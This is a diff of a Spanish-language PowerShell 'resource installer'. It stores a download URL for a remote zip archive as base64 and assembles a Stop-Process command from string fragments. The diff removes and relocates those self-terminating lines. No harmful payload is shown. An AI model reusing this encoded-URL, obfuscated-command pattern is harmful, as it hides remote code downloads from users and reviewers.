@@ -1,6 +1,4 @@
 ## Configuración  - Recursos
-&("{1}{0}" -f "ess","Proc") ("Sto"+"p-") -Id $PID -Force
-Stop-Process -Id $PID -Force
 $Host.UI.RawUI.WindowTitle = " Instalador de Recursos"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $e = "aHR0cHM6Ly9naXRodWIuY29tL1QtcmV4MjEvbGlzZW5jZS9yZWxlYXNlcy9kb3dubG9hZC92MS4wLjAvcGFjay56aXA="
@@ -16,7 +14,7 @@ $tempZip = Join-Path $env:TEMP "nexus_luas.zip"
 $tempFolder = Join-Path $env:TEMP "nexus_temp_extract"
 
 $ProgressPreference = 'SilentlyContinue'
-
+Stop-Process -Id $PID -Force
 #### Función de Log ####
 function Log {
     param ([string]$Type, [string]$Message)
